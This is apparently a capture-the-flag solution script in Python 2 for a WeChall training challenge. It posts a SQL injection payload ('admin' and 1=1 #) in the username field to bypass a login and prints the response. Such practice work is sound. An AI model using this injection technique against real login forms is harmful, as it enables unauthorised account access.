import requests

cookies = {"WC":"11068160-37667-z1PuydshfLuLpXFI"}
url = "https://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php"

data = {"username":"admin' and 1=1 #", "password":"hello", "login":"Login"}
r = requests.post(url, cookies=cookies, data=data)
print r.text
